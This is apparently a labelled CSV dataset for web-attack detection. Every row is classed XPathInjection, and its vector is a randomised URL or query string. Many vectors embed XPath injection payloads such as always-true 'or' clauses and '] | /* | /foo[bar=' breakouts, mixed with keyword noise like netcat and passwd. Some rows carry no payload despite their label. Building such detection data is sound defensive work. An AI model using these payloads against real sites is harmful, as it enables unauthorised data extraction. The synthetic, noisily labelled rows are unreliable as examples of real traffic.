id,class,vector
9599,XPathInjection,/gttWSshtef/tVonm1e9at14At/uarZyWeM.Z7vJ-pcaD/Tdap1iooIhooDo0r/uyse75fimtsszzi/vZ@BtzN_51FRfg50Aw3/soCDN@/iehhatEaa7o3nbneeA/exasfaen5.js?7a0hde8mw=wh9Teve&dco=hi%27+++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28+%29%3D%28%28+i+++%2B+++j+++%2B++k%2B+l+++%2B++++1%29%5D+++++%7C+++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++++or++%27uaohoy%27++%3D%27+sn6mlstE%27+or&Ehdreabdeos=rnetcatua%2B&yewytnrytfale=%5DnG8slikebetweenylocation%28i8e&rsiA5%u=622&citfeloon=ucVjbw&t6=tuEaF_%40n&EbyfO8hrhtE=2886485133
9605,XPathInjection,hEizTac4my=rd/aEea/rhmin/child::node()[    position()=5]   |    aBohT/hId/siOojr/child::text()[position()=288]    or    'obnsih'  =    '&bn=lGVlUZ&ot2o=Adf9xkuurmevaltu&onbns1aur4=e6az &ulhnhatene8ulDs=eouaaedgdEa&13ypa=nd&ewrmrmrevn0ter=aAyino46nuy&erstir=255
9622,XPathInjection,/td8tsqzond/rHheAmyVeL3gvdr/@psoGsj/Xgae/ea/qUXgxtermm.asp?nahi=randeetjrfr&Gusr-y=aasywoa6asceytedN&HZ2j=sElMI31M&sc0ts8is=Rikrn9%27++++or++++%28i++++%3C++count%28y6S8%2Fchild%3A%3Atext%28%29%29+++and+j+%3C++count%281oyBe%2Fchild%3A%3Acomment%28%29%29+++++and+++++k+++%3C+++++count%28anohro%2Fchild%3A%3A*%29+++++%29+++or++++%27iak%27+%3D++%27+++++LouTeyer%27++or&i5u=2CkimzX2TKf
9624,XPathInjection,/lb./rmnW6kOV.P/SC/wYvKUAmPlu6/npdfoezipon/hVI.x3JhuKsg/tsbh9kb4ni9geOni.mspx?e9sstnHlnodki2t=I9t%2FnrnMeo%2Fda%2Fchild%3A%3Anode%28%29%5B+++++position%28%29%3D878%5D+%7C+++ahe%2Fqsins%2F5ebd6r%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D1%5D++++or++++%27Ciaroiec%27%3D+++%27&esmN=935&8eyU1hQkNNe=eaet8hUa&1WyhdkesIennjEa=14449&fm8=tflaenyntn9io&azettpo=55245
9655,XPathInjection,/nIewsnnh0xoswbha/wb0se1o/Iaoio/c6.J4DE/8l/8-JCraFPIP/inV.ZxAaNZbt9A/OTWYlbps.png?tetos0t6Sgt=e&c2tcncaqft=23&sirlgefYsrr=71&H5XJqPyDI=y4smt4s&sni99s8sn=t8trDltif&IyFC3bnetcat=9807401605&shtacolehe02Trg=6+++++or+count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D++++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+++39692%3D&1Ttrsniirm=%2B0eo4mnei+o&hrNiYTudsyi5cpl=%27e%5BgeOsock_streamnoea%2B%2Bty%2Bsh+&stbzsoEaunum=nDswb5+slgt&suntj=lltshutdownthttp
9657,XPathInjection,gyh=cH7wE&dan=082291345&jAlwEr0est3uco=773475&foTTBc.=nsa&oditt=000414&AnT.from-@=vnbdtlesi&psystemVMcR..H5-=it9ea3e7'   or  (i <   count(ebn/child::text())   and j    < count(Yxa/child::comment())  and k  <  count(isticn/child::*)    )  or     '6ylOyee'  = '     Twaoe'    or&aitnx3cfosa1evp=33389
9659,XPathInjection,/yhjErnqi9knataZ0r/tQme4fctmFFWqHY1a/hdcF3i4RWo0PobQ/dgU4WjKBue/CwherewusrqyA8QhQv/e0atquxhfsT8/Za1FpSpoXietcdusr/xbefirtwaltIN/NtguahaiJne/nkiQB3FCZQdsq0G5/wb0UDQ1.tiff?anat=5544507&s6pkdaf1uLrseit=hdxsn&6slmsy=87250391&rnesreoe=r7Nfje&enprthji1utg=aaacceptko&Nhq6VXX8Mu2htacces=18222&tTtszvcooWt=3eina%2FyniN%2FdEsH%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D1%5D+or++++%27hssstyo%27++++%3D+++%27&eleDJomtvf=30978375&sNs=er&sneteed=bie8sbtmeh&i3ddO=6279832562&tr8isej=lb&sxH478e=6&eerso=366&fohr=5443369
9669,XPathInjection,/08ChuttSf0P/2eahuue/aso5Wi4d1cerli/nGjlkUsHbssI8Qxv/ym_RBRuZWsmA1yC/oHeobxsx.shtml?6WaPvnsndxbMex=Iut%27+or+eo9uw%2FcmEm%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D8%5D+or+%27dtE1%27%3D%27&dehaRdlayephaea=59&FNEVdb3etcwhtmp8=TARlg8+edropar
9671,XPathInjection,/lrsheepoeg/D@vzQ/Xmeta3ETYUpsVls/or4owod7qm/qetizasOr/a3iidnyqrPntj/Cxp_Ww_.pl?
9673,XPathInjection,/jH84Crfvwo.tiff?fetuteFpUlsb4la=3553+++or+++++igaed%2Faddgr%2FduUoo5%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D669%5D++++or++41%3D&uimn=eiClL3&adifvs2ioy0=4&eoblml=bo&esmel=xiyeoiHeot2rhsWu&evuci6=iteyxle&biErde0ciiuok=tuPjR0ITase
9676,XPathInjection,/iCYYLg9QkqoqRJ/megddlebeedres.jpg?rt0vate5r=se%27++or++++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28+++%29%3D%28%28+++i%2B++++j++++%2B+k++++%2B++l+%2B1%29%5D+%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or++%27hn%27%3D+++%27+++++Dsi1ua%27+++or
9682,XPathInjection,ot=86   or egrA/tds/eys3/child::node()[position()=31]     or    5058=&oatin= x&e7stie=0YRXwhx&TCs7P2=8053085
9683,XPathInjection,lofriaot9gdm=eghosqkEeoHe&la=643232065&ee5essxorndcIt=jttaak2hdeK1llr&st4nb=xBoTr7&ttUiaiisbOtnda=8556&ci6qemtV8yltaBG=ttIeogmha&KlikeiE=iAddi'    or    path/child::node()[position()=N]  or     'edysTu'  =  '
9691,XPathInjection,/u5sUcseaotpalaoeat/olrpeEihdih/-mailpScSIegzLr/wpXWcFF-h./mWQu/C3M/w4Ddeqo4s4ihrssshaw/NIsRaL4st/etdjte3unoHne.mspx?KNG6du0L.qxu=2tAaahavingpasswd%25NsAf+winnt%3FbyKet&e9lbd=7y2sTpi%27+++++or+++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28++++%29%3D%28%28+i+++%2B++++j+%2Bk++%2Bl%2B1%29%5D+%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or++%27tah5%27%3D%27++so3sd%27+or&jmetastdinvPG=kot&shmga7=1
9692,XPathInjection,/iiwe9iecrEhsoo/Ajaya0/nM/rbrtwgyeoEiSTTae/t1eomdar9iV1s.htm?1BhR0hshutdown12H=Lsr8yandy&eae=8&nrkmfaift=16&srooacrkFu=58&Inacrut=+tdibs&aoboptm7ri=s0GrQ2XpwNK&orBph89cx=i0alrhetNoloee&h2=euMwaobinrAtftpacceptti+&er=alu5aheib3ulesa&enGErahasert=fg3rsltnoeo&ae0eleni=rfctuartw&s8wth5ie=us&a8cwe0zFn5tjru=3uitn
9696,XPathInjection,/ttWHPRfIUZ/o4BFPL85zpb/rthinn/fivheeeaeeBdarr5t.jpeg?r9ct=3342&5acncnnbtado=mGp5Rbr&Y3h5erv=1404++or+count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or+++++9882%3D&hrIhm1=copyneSieb%2FY&a9bpMqii=n2f7ZmXRk6Jv&rzsdsnNo=2608&4WcopyzN2kHT=6&thtmlbAelcrg=9
9702,XPathInjection,/xBUB.UWiH/rt9euCpobnT8aR85/d83PeAWB@8LSc4uxHZ/aHWxQokjox07ukrA./TdocumentCtYB3Qj52replaceju.gif?th6fro=8564&eh=iL0&3SdQg=ns8.&wbug5=679++++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or++++44862%3D
9705,XPathInjection,/e7Cey50xlths/ARJ_/exRflwz9r16dXtJv/OrB1winntinputr/eH13/61QZaTlKeweoX.SHha.html?ivC8=9t&rKn=%28i+%3C++count%28er%2Fchild%3A%3Atext%28%29%29+++and++++j+%3C++++count%28byoy%2Fchild%3A%3Acomment%28%29%29+++++and++k+++++%3C++count%28d6it%2Fchild%3A%3A*%29++%29
9713,XPathInjection,/erwkxU/ikdApvsxo4/asesmOtii.bin?rSde5oorgdlWeo=z1AfOqf2F&lgElozo=qc2%27+++++or+++++%28i++++%3C+++++count%283nu%2Fchild%3A%3Atext%28%29%29+++++and+j+%3C+++++count%28r3%2Fchild%3A%3Acomment%28%29%29+++++and++++k++++%3C+++++count%28Emp%2Fchild%3A%3A*%29++++%29++or+%27e8ptrt3%27++++%3D++++%27+++sr%27+or&7ydb7s=rnbs-yUh5HL&ibrtcrjnea=2ihaE%3FiBh+&tabrRel0l=vsojb6eehbnn&Hlse7waqOre0=rs3
9738,XPathInjection,/stESn.js?@jMstyles-qoB=Trxaeh%27+or+%28i+++++%3C++++count%28dhacm%2Fchild%3A%3Atext%28%29%29++and+++j++%3C+count%28yhlqO%2Fchild%3A%3Acomment%28%29%29+++and++k++++%3C++++count%28fEf%2Fchild%3A%3A*%29++++%29++++or+++++%27daieaQpw%27+%3D+%27+++mh0lie%27+++or&qlibLwopDXp-=etGF-CESryk
9752,XPathInjection,/reCnosnct/nebJmvUbFiAvO/ivNeu/IEgroup
9754,XPathInjection,/apNOKzo/deboot.iniS1qCcat@75CHU/ehV5jjK95/KZe-a7Dnhsam@93/eht0dninLsrBennaoz/s9isoeei.mspx?t0iebrauhte56=3niheexAb7s9eqWcoe&r8v=kcIKq_J0yeg&hfailokoh=nenjuytieeHe&krAsnvhytEe=m9tmiArab3w&tctewlterml1I=%28i+%3C+count%28WEEbr%2Fchild%3A%3Atext%28%29%29+and+j++++%3C++++count%28whtdS%2Fchild%3A%3Acomment%28%29%29+and++++k+++%3C++count%28sn9me%2Fchild%3A%3A*%29+%29&8-servicesgh=eiEonaft&iir8hEou5siK=e4aanachtslncXa&evt1ix23xytsh=Arff+ttoncscriptLpxe&rmutoe=7164554840&srah9svenogah4=mCtwL_T%407&het5aaesdatb=af%28nc5ns%3E%25eh%3Dtea&v1sremi=vrTu0FZml&e_jHk=2eC2swld&hr43ioqjmtip=sn5&TS3.xF@t=f0ehj0lltt
9757,XPathInjection,/sEe6@/eppeAbl3rnek/pCtawHV13.2/dMALu8tOV3OMjb/e8N1t6PAo/ootEejd/hVBJx9uUjzSgVSyVWAYd/e@3r_6m.K/s4FZK@k9zyAPesre/n5uceI3enceaetd1.css?iakTbegamia9set=aepp&8nitrrio=Meemnbls0aTn8y&odejtriatIsqiol=9g1TE&jRbnrcoxcruoa=y%28&eTg74xrtly7yd2t=wiceq&nan=adMZCYCmdJOj&xqnt=ST%5De5AyfhraS&6ia8euidaNkqeoo=nsssbetweenthf+0+u&d1Ko6=s%5C%3Br&renm=9537787&2Mv_jxObTZ1=%28i++%3C+count%28oa9%2Fchild%3A%3Atext%28%29%29++++and+++j++++%3C++count%28zeme%2Fchild%3A%3Acomment%28%29%29+and++k+%3C+count%28s8aPt%2Fchild%3A%3A*%29++++%29&C_Ub9access_log-FXZPn=aenfaccept
9759,XPathInjection,/zgr8sSl4moo9/of8EtitaubXsmcrR9cnt/rola2reolya0/haFGuvy/htn4ssejw3nfkobau/etFyaAhWoeyR9S5G/oe8skre/ntjyJUK4Pm_.dll?@k4dWd=i_lNGq&qstfagyaebpo=zec4&on9de0ndix=csceHtuomaPlerf&scqc0e=ordsnCiitsh8k&72bGjWjhCr=01438187&wv=trEo&nulabethyWp=iac&9vpigtkds35y=1649944&JgONiuncvPc=x-57BhS9HE&ercsonuh3aea4=owht&iferoofe=hn+&oiiye6bE=gTmE&uecrvnnnbh=3&mshsn4=%27&R7=iEj
9769,XPathInjection,/vp1nQ/3oFEu6styleroQinsertCM/7ugddrnAryet9pQaoi.jpeg?nte=d.L4xQeszbaj&2qrt7whtkr=iyt4l1Tsz7TFs&lZnk=etce%24dc5jtmnd+f+sUsam&n8i=eioris37otl&htaccesGwCymyreplace=eeeedrdw%3E&etnDhtmyaeatsln=ax&s7sutucesrdi=74685
9775,XPathInjection,7kanotaeytaPas=595415337&ivOYor.Z=994444&t5eor=iii2en'  or count( path/child::node()[position()=((    i   +  j    +k    +l   +   1)] |  path/child::*()[position()=(k+1)])=1 or   'iAu'= ' ptetole'   or
9780,XPathInjection,moonrseup=sesia&sfR7ms8=iSQWN-8&dn4nCtaaalZll3=532999&duaeeiaioe=idC/n&mze1ncdDsNt=eNp&ItmpTb7S=ePVNpak2ivc3
9788,XPathInjection,/5iOwBInx2E.tiff?xdmry5=copycopy%3Aliker&wiw=olUsrtn&lnaeenbriscs2ah=sh%3Bs+abua+o%25gmaxy&OlogetcD6idUQ=v4QCgpUUgYtd&eeuhtzeoapl6=eiF0X-3gF2K4&LaseR6ttoarkpbt=sAuonedp5ts9d9ahps&pnbuuWand=oiq%27++++or++1%3C+++++OoN%2Ft9ri%2FiQaa%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D250%5D+or++++%27wt%27++++%3D%27
9800,XPathInjection,d6hlhWd=468065&Ittaa2se1eiyr=2576&8@GJ25dropyykjg=nEIJxH-&N3pDkopt5.replace=1492933&hse=connectI2p%ul0&LmPn=Gtptxpioib&tinmtc=445AzL9a.MF8&Aa_pMqcLp4=2504157
9809,XPathInjection,/3naonlr00wlsAIhcy/oe4aaaeeXczycTssaeo/cmd1B8g/m1urssztaya7tehn/aee/qJYQ1PIEsJ/8Y1NU20flJgPcEO0hLO/tyynduA.js?0APxc=eatasiabeupaeuS9f&m8R2op=7heno%27+++or++++%28i+++%3C++++count%28Wjtr%2Fchild%3A%3Atext%28%29%29+and+++j++%3C+++count%28a0sx2l%2Fchild%3A%3Acomment%28%29%29++and+++k+++++%3C+count%28oldinA%2Fchild%3A%3A*%29++++%29+or++%27Nc%27+++%3D%27++++le%27++++or&2XnLFXFp=anin&jqd=bF1LIyt&uashe=nvartrohomem3&dlioeoponc=rmce+%27%5Bnabody%3Bf+lenull6%3Am&atPUelbuMh0EsTn=j0Bzywf-Z
9816,XPathInjection,/lf5Lqp5@KI0T/aVVS7rozs0/onev/sU_m7Ijik/orw1i6cvehlf4Hg/5U3nearciIn/a2/oCunaso/dTc@StwsHoaeKeUSnP5f/ee8orrnmb5S2bev94/qnnHoBauTo0iPemsa.jpg?aoottnaii=ohmesD%27++or+++++6+++++%3C+++count%28path%2Fchild%3A%3A*%29++++or+++++%27tl%27+++%3D+++%27&ztawlftEDtp=b_19jarppi&plrdcdfd=rnesa6lVT
9848,XPathInjection,rod8RjaHh=o5breplacecngcnodek7&o0m=morEhtiin&rtiothbos0g=tebyvagy &fta2n5aDr6=0029&dwsiuysehsj=hf_D&aRnso2c1iih02tk=ernelme3oatbio&i0aeaetcmitpR=gsea'   or     ee9hee/ela/child::node()[processing-instruction()=31]  or     'gret'   =    '&i4fld=Abinai
9850,XPathInjection,/aIcgomag/_O/rj/MS/eha3l/ls2mrt/D5IDAallWAKG1winntwWz.sh?e3eTxshi7tet=%28i+++%3C+count%28cr%2Fchild%3A%3Atext%28%29%29+++and++j+++%3C++++count%2872%2Fchild%3A%3Acomment%28%29%29+++++and+k++++%3C+count%28dk%2Fchild%3A%3A*%29+++++%29&hnnfrslh=bcrsR&iiexbattuthtomf=lPe&QCxwindow.open-MselectR7OWS=+&em8eaeoDbieehn=tQ%40voqq&kir6aNT4=72954987&3Tiszbl0Oh=kPYys2on&BD6ZlyUr=chmSs7ment9ablhpno&RriP=1840&psTvooimrtxo=%28ohmatA
9860,XPathInjection,/rwbmcaienEB/a.FbGsuDhQ0/ycN2UFYMMRL4/AhLE/iiitcnlQFegTz.png?sst6dtunan=95421&Pw6S6wvJX=fhrdspo%27+or+++++%28i+++++%3C+count%28tib%2Fchild%3A%3Atext%28%29%29++and+++++j+%3C+++++count%28ew%2Fchild%3A%3Acomment%28%29%29++and+++k+++++%3C+++count%28pOeStx%2Fchild%3A%3A*%29+%29++++or+++%27t5oq%27++++%3D%27+ahbOdtcy%27+or&aess1=%2FKpHsnU%3DservicesshutdownnoojnlulE%3A&selywtr=+tsot&le=934565&ZWo4OUa=1599773&iorciNsrenmr=yZqdEtnHtcBh6cp9&libhUcqTRdelete.6.h=988201111
9864,XPathInjection,/nromadiTDhf/odhUe_iM-@6w/2log7t4G/HOD12htacces0OinO_homeF./puttf/1fKKu@0WnPwUB/wdoWnaskinuusup/wSR8WwIprocessing-instructionvP/tAhrepjeeouewl1O/O1gaahtehy9dftooEe.shtml?heihiaue=6+++++or+++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+948%3D
9867,XPathInjection,/Hmboot.iniFetLF.php4?rat0bwInbit8eWb=s%3AUprocessing-instructiond+oconnect+&adovO=sthtacces&hAUEora=RhyeHh&hKacceptn6vstdin=xsla5uoa&st4lsVpTsi=335237&0orotec7sh=68234&2ichibj8a=ernEtesztnw&nsztgl=Ntvndo%27++or+++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28+++%29%3D%28%28++++i++++%2B++j++++%2Bk%2B++++l+++%2B+1%29%5D+++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or++%27le%27++++%3D++++%27++++erb%27++++or&ypxhlrngrdh0rct=iseOhsm+EswtMLM%26+&ebiwc=0t%3F
9875,XPathInjection,/hLas6c3frtgmewe/bpoeptho/al-oMu2-uA3vN/mbee.php3?laaqrgioi9rj=argo&R3servicesc8dXSreplaceconnectl=Htnylnmeddtsnzl5o&bnumwosao=irNoedEepepiln&esThXNRy=tzoykzb%25uilaeendfteai&nhantD4rch6Euow=-gs&dcaatednnaf=altDE6V&ecenhsR88a1o=pYta&imgWREi=0heuwo&0geh=+&tu=eao1Tnsxhbnge&dpoedrdl=datlchild8qfrom+hetcopthtqhl+t&DetcyLmocha9D=og0sgwe%27%5D+++%7C+++P++++%7C++++%2F%2Fuser%5B++++name%2Ftext%28+++%29++++%3D++%27jidep&mvt7n86aiadadum=171&7Y_xmlbBIm=356
9880,XPathInjection,/SulyRenaF/d6ettaDdRuybdtilr/cdtfhsmgjrdeuenTu0ii/att/R.UiuobjectAi8/ao/dTfxxjX@j400Z8/ubiletnS2E6tstJEex.css?inaocke4=44&_UOD90t=tEGSg&5sxeiu=sutcE%27+or++++1%3C+oet%2Fna%2Fikt9%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D80%5D+or+%27pS8o%27+++%3D+%27&beceatetn7w9m=mHqZBqu&3idaseetst=ttYt6%2Fe%25o0uIl+bee7F&ut=n%26llEn%25u&etcrost=openzsqN&tcEsoh=llna&sedete5ipheod=a3iKTY1rm&oaisnen=sy+pie
9881,XPathInjection,l4rx@nk=a((St&g58hg=a &athe=w tDiasarT&llqn6bn=isaemandegtoecvo&eenyEootdeopVa=ebgsoundeu&bry=6e2&a8h=nuY986sv1rl-&ns4sheoroiT=it7fgoSAio4ejet9e&l8uo0os6alwEhfT=5nleinclude&icsrS=4mmrEiahb&eyi34aX5ls4p=mmn&Ttbylityi=(i  <  count(eat/child::text())     and  j     <  count(4ulft8/child::comment())    and    k <     count(ao/child::*)   )&pirN=r
9885,XPathInjection,/81gNfBGfy2CpBoP91LJ/exXoh/E1KTLdEqG/deleteX2G/of_nnG/eIsE/iXSFq5YfUgwYxwqiwY_H/lPok2LQx/oSo/d.mmq.css?fTdnoAs=hhzt&xhx7ET=EfcnslfE0k&uyb=77&2pgR5elowcs=S%40%25+&4d3ebtwttper=oxn.s_jckc5&ym9gnEsfX=iessotezmenredtr&8pm9kbuze=y6tehh%27+++++or+1%3C+++rtfc%2F3eE%2Fmhh%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D72%5D++or++++%27imtrf%27+++%3D++++%27
9886,XPathInjection,/ocC1Z7JGaiZmykh/iQ0./ejnUErvtvohnu9ec/K9/doc7a3mfbanhasnnn.mdb?oi2=antde5tyL%22h+%22oG&srnhfnE=llnrbehEgT2&5hY20uihlTeoofc=Swgei&errt=30875446&keunseizSaemh=05&pnwon5zolETmn=wuRgehcoly&neos3wiadegtgS=%3An%3EiIlogunion%26xaem&k2SdEpM18-Nh=749++++or+++++1%3C+++++src3%2Fy%2Ftw%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D460%5D++or+65%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
9890,XPathInjection,/tgrwutre3h/19RgFfL6pbce/taekrtsoipnmtken88ng/FcopyLJ5hajWKK5exec/rrs2yrnteebFsieOn/buIngannhwhhhi/yDewo5hk7rosha/aPHD9Mg0X4Sv/hMmr/sLiBTswTd.php3?03d3u=StaseU&ofrtee4sjeid=5tkI4&bysbhEgptMaa=eeoir&Irherr1taoAnai=n5eeitst0fxihlm&inuItemyi=fh&xedtaior=es5tsf3TEs&nesqOet=OnngXthufnnos&teRi=siGc+2s+a9ba
9896,XPathInjection,/9e9/thau/KYpositionApositionL7cPqtMwgetI./sy.js?raow=nestipt+s2ni&0dhit=tdEe9&w4ce8id0ErenjU=eo4orabteesyebwmp&dztie=25&gw=e4+ifnbetweenel&1vdz4=wtho%2Fn%2FateeGa%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D7%5D+++or+%27Ng%27++%3D+++%27&cleeo7nas3ws=pD3seweegll+v&Efe67EseA6n9een=ygQdZuSdE&8i7KabinB0UKE=75&ohotryeoOmc=vae%2F+eiGz%5B&wop9fdratAar2=rmnEyEfptteml&pio2asMeqip=8239&ytrztnwenib=6600672&dCzhVb.ODJQ=0442405949
9904,XPathInjection,ot8reoeftswamu=6   or   1<   pc9ete/f/wtg/child::text()[position()=273]   or   7204='] | /* | /foo[bar='&tferoirg7t=4040730&8ZMbin1@jnC=600202&S7lhyorlo=meo&tirh=oHQxc&5arqeqtioct=37070&n4docsqeawtj=n8_WIYW3&dey3tSjt=ps9rtm0daTs e9si
9912,XPathInjection,/t_c6W21-98vQ5QF9q2g/nSW6zQx_chaving/rQ0KhMK/eE9AF/0A4tdtTers/Eybrt/p6mstdinj7IQNka-j/u@nzkKIz1_w5i3/ibuL/7XemMaapnclcdu0g/Qg/ceyi.php4?
9919,XPathInjection,/hdmss2IsiuO4iwprGrs/ypcaasieNs.shtml?n_y_BtlTselectGbetweenI=to%2B&rDpstxodossePmt=%24le1t&pubseeoybe=amrv&dt=1497&csbhsatotee=H+%2F1&tkvnoh44eiswceQ=im&ng=7&txEn=e6C0FVoLo%40&clw=ncit&So=7&lri4nsncyncinho=8&eeii3dw4=22236&arr=nw&5th=130907&Yobyve9wus9wbs=oersm4husn4hu
9921,XPathInjection,/kW/csasifsersnwarrcyea/itgcTSIo1tlTsozaemis/f8yas09mecdo/antnh7onDfetn/child3p/Yn2nsS/awJT/pas/q8i9ts.shtml?iLea4wbi=gsda2dltodri&1-Zo=ix5i-X&p.Gl=7qotiilLsdalioao&gKnoinTe=%26eehlcqrn6scatwt9ye5su&2hm1p=nautoexec%5C%2BinputvbscriptSoiframeiwp-u%3Ehw&nsEannvh=se9dhhtaccesan+&ar=6&nsi6dKriscerbt=ivnZz&AeeolseeEirsoe=qllVld8TUa&estsaopai=child2s&xsn9nturnaapt=3t+s&dts=f&nApznl=vprdn6YeNiiicGa&yn4rb=124347&yeEetufrmd=264
9926,XPathInjection,/tuiPZl0/8C9bNbQkg/cyhePrnnhnooa/rlcrYrRldueTen/xee/YKnAysystembetweenRTcmd5S/sNqg2Mw4Q2Y@U/frnosk/dosRaalcerdihmsm/pfu5pn.mdb?2aoe=Isd%27+++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or+%27reo5erh%27%3D%27&iYoe=a9tb6cdn&seIllttey=i8&oebHoootrccYg=768&CbinpbintmplE5MIC.=sGjGyaOPXg_
9928,XPathInjection,/nttcraynsiX/aesmanEdprurdms/sD7m8dee1z/cXuNUCVHHne3LHQK_Y0d/aveqtselrwhkTeae/gU6PIzfTI0LI/r498SnN/hxe34w/ohytdsez9dtrdgitykt/rsgPoStha/mNTw0/ug8z3jOM7_MbQaccess_loge.cfm?B1e=%3Eu&neeteehhonol=10&Xtlrrha2=3616522&ura2heh=95621874&u5h=1560142209&susnnap2=ygi9Tkti3l4shl&iulhiteyn=lsinomr&6uah=eVCgRXnLl-&ozKi7s1=asODsivqCg&9ccUB60=end%27+++++or+2aDe%2FU%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D09%5D+or++%27lz9hn%27+++%3D+%27&ethuD=ozCIT50xF
9929,XPathInjection,/Bn/gYFWlx.QE7@./tSdet5cielositooows6/gEhvV_96Bc5WJ/sryaeli.pl?ltayne6a=7&zIF3519CGia=tw3wArw&tiiodf=sh&oeiirhiier=e9tANe%5D&o3iaewkuisha=ostnUtitulHdniiM&eIoDf=hmgo&6idwasv=u3ilsnsr48dt&wahet=+e%27usrn&gr1e4anactopsu=5oO&dnGzti3=grTmu%27+++or++++1%3C++kee0%2Frtnbrd%2Fren%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D5%5D+++or++++%27Irne%27%3D%27&bneEplod=eoamDHte%5Din+U4r&4nk=1
9946,XPathInjection,/0vkE2m.eS.jpg?uenzetus1=gfnaAeote&EZGcmdfm=c%2B&nRhDoecho91itelnetyI=tYNDLTmZtj&anf8tuia=5
9947,XPathInjection,/efrwa6ganoeoa7ipuwiu/c1esOjRCESqn-DS7J/DLDx0ZLHlikexlpM/aisetote3elr3he/tkSD-QHGDer9.php?Hnuct=tah&ecg9h=63012008&BopthVXAgW=ostmpi+n%24%3E6&Qhatrnri=mCE&WuzlTh4lusa=te8It%2FigneCi%2FTsxrr%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D066%5D+++++or++%27ock2ch%27+++%3D++%27&_@oR9EcWxlinkQ=2iJih&etXoihr=s2HvZ&rhzrporhuW=86stidriA%3B%24p%40&ZjUxLG8W1fsam=lem+&seiab=lt%3Fe&ZrXdeleteX2=zpositiondhe&ll8nW=e4p2hd&Fgedn4iawonvui=wh
9951,XPathInjection,/fizp4TZ.b/e.EidGNwq/updates6HoT-HSdocument0Z/2GmJuUNFYDeaccess_logCc/eEEToK2ICnPp/bamtlilwoeae6/.andoeKQ/eJ/epANOF8/nt3oUdxNgz9j/3UUz.btmk45/ynee.swf?SriNrznabnozlec=49&iAB=a5%24h%3Bueo&ti=mndaart&pudn=nmpdt&oa3ashast=bodypnno%2B+a99&tsenw=787&dro0ra=d.BF&NtomlEo=gsehh%2Fieipe%2Fi%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D3%5D++or+%27ceo53%27%3D%27&e3=fW.vqv&xp_I1PpKnullIc=gFJHCslVH&tmwsa=39
